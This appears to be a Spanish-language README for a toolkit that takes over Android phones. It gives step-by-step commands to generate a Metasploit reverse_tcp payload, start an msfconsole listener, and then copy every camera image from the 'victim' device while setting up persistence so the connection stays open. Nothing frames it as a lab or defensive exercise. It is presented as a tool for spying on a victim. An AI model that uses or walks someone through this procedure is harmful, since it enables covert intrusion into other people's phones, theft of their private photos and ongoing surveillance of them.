# 1. Genear el payload

Para ello utilizamos el comando

```shell
sudo bash payload.sh
```

Este comando ejecutara un script encargado de generar un payload con reverse_tcp para un android, por defeto utiliza hostname -I, y para el puerto 4444, pero se puede modificar o en el caso de no ser compatible, utilizando el parametro -ip para el host y -port para el puerto ej:

```shell
sudo bash payload.sh -ip 10.2.5.80 -port 4443
```

Ten en cuenta que se puede poner solo uno de ellos o ninguno.

# 2. Configuración inicial metasploid framework

> [IMPORTANT] Asegúrate de estar conectado a la misma red que la víctima antes de ejecutar el exploit.

Una vez todo este en ordenn utilizaremos el siguiente comando

```shell
sudo bash loc_and.sh
```

Este comando ejecutara msfconsole, descargandolo en el caso de que no este instalado y realizará todo lo necesario para enlazarse con el payload previamente creado, tambien podemos al iguel que anteriormente asiganrle una ip o un porto con -ip -port respectivamente, por defecto el puerto es 4444 y el host es hostname -I

# 3. Una vez conectados obtener datos

Una vez conectados podemos hacer todo lo que desehemos pero este pack incluye una forma rapida mediante un script de poder descargarnos toda la información que deseemos de nuestra "victima" envie todos las imagenes de su camara a el directorio /data
Tmabién generará un archivo de peristencia para que no cierre sesión en ningun momento, y que siempre que no se apage el dispositivo y permaneza en la misma red se esté conectado.

```shell
sudo bash get.sh -u $USER
```
